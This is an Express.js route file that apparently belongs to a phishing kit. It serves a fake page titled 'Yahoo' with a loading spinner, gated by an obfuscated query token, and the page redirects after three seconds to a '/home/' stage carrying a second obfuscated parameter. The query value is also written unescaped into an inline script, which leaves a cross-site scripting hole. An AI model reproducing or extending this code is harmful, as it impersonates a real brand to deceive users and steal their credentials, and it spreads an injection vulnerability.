
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.uihdft948fdjxgjdferuidh;
    const url = `/home/?wwwkjgfhdgudgherueru9843efjdfhfwheur=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
    <!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths template user_font_size_normal" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Yahoo</title>
    <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
    
    <link rel="SHORTCUT ICON" href="./images/img.ico" id="DWT2" type="image/x-icon">
<style>
.loader {
    width: 30px;
    height: 30px;
    border: 2px solid #f2f2f2;
    border-bottom-color: grey;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
    
    #loader {
    
    height:100px;
    width:200px;
    margin-top:280px;
    background-color:#f2f2f2;
    padding-top:35px;
    
    
    }

</style>
</head>
<body class="user_font_system" style="margin: 0px; overflow: hidden;">
	   <center>

	<div id="loader">

	<span class="loader"></span><br><br>

	<span id="load" style="font-family: Helvetica Neue,Helvetica,Arial,Liberation Sans,sans-serif; color:#8b8b8b; display: none;">Loading...</span>
	<script>
	setTimeout(function() {
	  document.getElementById("load").style.display = "block";
	}, 2000);
	</script>
	</div>
	</center>
	</body>
	</html>


    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router
